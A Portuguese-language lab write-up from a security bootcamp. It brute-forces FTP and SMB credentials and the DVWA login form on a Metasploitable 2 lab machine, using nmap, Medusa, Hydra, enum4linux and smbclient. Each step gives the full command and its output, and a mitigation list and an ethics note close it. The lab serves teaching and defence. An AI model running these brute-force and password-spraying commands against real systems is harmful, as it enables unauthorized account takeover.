# bruteforce-lab BOOTCAMP DIO.ME x RIACHUELO

##  Objetivo

Simular ataques de força bruta em ambiente controlado para estudo de vulnerabilidades e mitigação.

##  Ambiente

Kali Linux (atacante)

Metasploitable 2 (alvo)

Rede Host-only

##  Enumeração

Comando:
```nmap -sV -p 21,22,80,445,139 192.168.56.101``` | 21,22,80,445,139 se refere as portas que quero acessar verificar | 192.168.56.101 se refere ao ip do Metasploitble2
Resultado: 
```
Nmap scan report for 192.168.56.101
Host is up (0.0044s latency).
PORT |  STATE SERVICE | VERSION
21/tcp | open | ftp | vsftpd 2.3.4
22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp | open | http |  Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: ********** (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
##  Ataque FTP

Comando: ```medusa -h IP -U usuarios.txt -P senhas.txt -M ftp -t 6```

Resultado: 
```
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (2 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (3 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: abc123 (4 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (5 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 12345678 (6 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 12345678 (3 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (4 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qwerty (6 of 6 complete)
```
Validação:
``` 2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS] ```

##  Ataque Web (DVWA)
Comando: 
```
hydra -L users.txt -P pass.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
Descrição:
`-L users.txt` - Indica o arquivo contendo a lista de usuários a serem testados.
`-P pass.txt` - Define o arquivo contendo a lista de senhas a serem testadas.
`192.168.56.101` - Endereço ip do alvo onde a aplicação web está hospedada.
`http-form-post` - Define o tipo de serviço e o método de autenticação a ser atacado.
` "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"` - Esta parte é o núcleo do ataque e possui três componentes separados por dois-pontos `(:)`:
`/dvwa/login.php` - Indica o endpoint que recebe as credenciais enviadas pelo formulário.
`username=^USER^&password=^PASS^&Login=Login` - Representa os dados enviados ao servidor durante a tentativa de login.
Significado de cada elemento:
`username=^USER^`
O Hydra substitui automaticamente `^USER^` pelo usuário atual da wordlist.

`password=^PASS^`
O Hydra substitui automaticamente `^PASS^` pela senha atual da wordlist.

`Login=Login`
Campo fixo enviado pelo botão de login do formulário.(F12 > NETWORK > FAÇA UM LOGIN TESTE COM QUALQUER CREDENCIAL> ACESSE O METODO 'POST' QUE FOI CRIADO> CLIQUE EM REQUEST> BANG! CREDENCIAIS SOLICITADAS PELO FOMULÁRIO.)
`Login failed`
Texto retornado pela aplicação quando as credenciais são inválidas.
O Hydra utiliza essa informação para determinar o resultado da tentativa:
Se o texto aparecer → login inválido
Se o texto NÃO aparecer → login bem-sucedido
Essa verificação é essencial para evitar falsos positivos.


Resultado: 

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

Hydra starting at 2026-02-24 09:24:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:4/p:6), ~2 tries per task
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-02-24 09:24:15

```

Validação: ```[80][http-post-form] host: 192.168.56.101   login: admin   password: password ```
Evidência adicional:
Login manual realizado com sucesso no DVWA utilizando as credenciais encontradas.
A ausência da mensagem “Login failed” confirmou autenticação válida.
## ⚠️ Limitação Encontrada — Medusa em Formulários Web ⚠️

Durante os testes no ambiente de laboratório (Kali Linux → Metasploitable 2 → DVWA), foi identificada uma limitação prática no uso do **Medusa** para ataques de força bruta contra formulários de login HTTP.

###  Problema Observado
O Medusa não conseguiu autenticar corretamente no formulário web do DVWA, mesmo com credenciais válidas presentes nas wordlists.

###  Causa Técnica
O Medusa é otimizado para serviços de autenticação padronizados (ex.: FTP, SSH, SMB, Telnet), nos quais o protocolo e o fluxo de login são bem definidos.  
Formulários web, por outro lado, exigem controle detalhado de:

- parâmetros HTTP específicos (POST fields)
- tratamento de sessões e cookies
- identificação precisa do padrão de erro/sucesso na resposta HTML
- lógica de aplicação (tokens, redirecionamentos, CSRF, etc.)

Esses requisitos tornam o suporte nativo do Medusa limitado para autenticação via formulário web.

### 🛠️Solução Adotada
Para o cenário de autenticação no DVWA, foi utilizada a ferramenta **Hydra**, que possui módulo dedicado para `http-form-post`, permitindo:

- definição explícita dos campos do formulário
- identificação do padrão de falha na resposta
- automação consistente de tentativas de login

###  Conclusão Técnica
O teste evidenciou que a escolha da ferramenta deve considerar o tipo de serviço alvo.  
Enquanto o Medusa é eficaz para serviços de rede tradicionais, ferramentas com suporte específico a formulários HTTP são mais adequadas para aplicações web.

###  Lição Prática
Selecionar a ferramenta correta faz parte do processo de auditoria de segurança.  
Limitações operacionais também são resultados válidos e devem ser documentadas como parte do aprendizado e da análise técnica.


## Password Spraying SMB

Comando utilizado para enumeração: `enum4linux -a 192.168.56.101 | tee enum4_output.txt` > insira a senha > `less enum4_output.txt`

Resultado:  
Muito texto, mas o que iremos procurar é:
```
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

```
Iremos usar os seguintes usuários:

```
user:[user] rid:[0xbba]
user:[msfadmin] rid:[0xbb8]
user:[service] rid:[0xbbc]
```
Aperte Q para fechar.

Rode esse novo comando para criar usuarios que serão utilizadas no spray: `echo -e "user\nmsfadmin\nservice" > sub_users.txt`
Em seguinda rode esse para criar as senhas que serão utilizadas: `echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt`

Rode agora o comando `medusa -h 192.168.56.101 -U sub_users.txt -P senhas_spray.txt -M smbnt -t2 -T 50` para realizar o Password spray
Resultado: 
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: Welcome123 (3 of 4 complete)
2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
2026-02-24 09:51:05 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: password (1 of 4 complete)
2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
         
```
Atenção na linha que diz `2026-02-24 09:51:05 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]` é uma indicação de que um usuário e senha foram testados e passaram e ADMIN$ indica que tem acesso de administrador.
Rode o comando: `smbclient -L //192.168.56.101 -U msfadmin` > espere >  insira a senha compatível, nesse caso foi msfadmin.
Resultado:
```
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
```
Você entrou!
---
# Mitigações contra Brute Force em Autenticação Web

## 1. Limitação de Tentativas (Rate Limiting)
- Bloquear ou atrasar novas tentativas após X falhas consecutivas.
- Implementar **backoff exponencial** (ex.: 1s → 2s → 4s → 8s).
- Limitar requisições por IP e por conta de usuário.

**Benefício:** reduz drasticamente a viabilidade de ataques automatizados.

---

## 2. Bloqueio Temporário de Conta
- Após várias falhas (ex.: 5 tentativas), bloquear a conta por um período.
- Notificar o usuário sobre o bloqueio.
- Permitir desbloqueio via verificação segura (email, MFA).

**Risco mitigado:** força o atacante a desacelerar ou desistir.

---

## 3. CAPTCHA / Desafio Humano
- Aplicar CAPTCHA após algumas falhas de login.
- Alternar dinamicamente o nível de dificuldade.

**Benefício:** impede ferramentas automatizadas de testar credenciais em massa.

---

## 4. Autenticação Multifator (MFA)
- Exigir um segundo fator (app autenticador, token, biometria).
- Aplicar especialmente para acessos administrativos.

**Impacto:** mesmo com senha correta, o acesso não é concedido sem o segundo fator.

---

## 5. Política de Senhas Fortes
- Tamanho mínimo ≥ 12 caracteres.
- Mistura de tipos de caracteres.
- Bloquear senhas comuns e vazadas.
- Incentivar uso de gerenciadores de senha.

**Observação:** complexidade sem comprimento suficiente não resolve o problema.

---

## 6. Monitoramento e Alertas
- Registrar tentativas falhas e padrões anômalos.
- Alertar administradores sobre picos de falhas.
- Implementar sistemas de detecção de intrusão (IDS/IPS).

**Objetivo:** detectar ataque em andamento e reagir rapidamente.

---

## 7. Proteção de Infraestrutura
- WAF (Web Application Firewall) com regras anti-brute-force.
- Bloqueio geográfico quando aplicável.
- Lista de IPs suspeitos (blocklist dinâmica).

---

## 8. Respostas de Erro Genéricas
- Não informar se o erro foi no usuário ou na senha.
- Evitar mensagens que ajudem enumeração de contas.

**Exemplo seguro:** “Credenciais inválidas”.

---

## 9. Segurança de Sessão
- Invalidar sessão após várias falhas.
- Cookies com flags Secure e HttpOnly.
- Rotação de sessão após login.

---

## 10. Hardening do Endpoint de Login
- Evitar endpoints previsíveis ou expostos desnecessariamente.
- Implementar verificação de origem e headers suspeitos.
- Aplicar proteção contra automação (fingerprinting de cliente).

---

# Conclusão
A defesa eficaz contra brute force depende de **camadas combinadas**:
rate limiting + MFA + monitoramento + política de senha forte.

Nenhuma medida isolada é suficiente.
---


## 📚 Aprendizados

- **Compreensão prática de brute force em aplicações web:** ao testar o fluxo de autenticação (ex.: DVWA), ficou claro como pequenas falhas de controle — ausência de rate limiting, respostas de erro detalhadas e falta de MFA — ampliam a superfície de ataque.

- **Importância do ajuste fino das ferramentas ofensivas:** configurar corretamente parâmetros de automação (listas de usuários/senhas, padrão de falha e método HTTP) é decisivo para resultados consistentes. Pequenos erros de sintaxe ou interpretação do formulário podem invalidar o teste.

- **Visão defensiva orientada por evidência:** cada exploração bem-sucedida aponta diretamente para uma mitigação mensurável (limitação de tentativas, CAPTCHA adaptativo, monitoramento e hardening do endpoint). Segurança eficaz é **camadas + observabilidade**.

- **Metodologia de teste replicável:** documentar premissas, comandos, evidências e limitações melhora a reprodutibilidade e fortalece a comunicação técnica do projeto.

- **Ética e escopo importam:** testes devem ocorrer apenas em ambientes autorizados e controlados. Segurança eficaz exige responsabilidade técnica e legal.

---

###  Agradecimentos
Agradecimento especial à Dio.me e à Riachuelo pela oportunidade de participar do bootcamp e fortalecer a base prática em segurança ofensiva e defensiva.
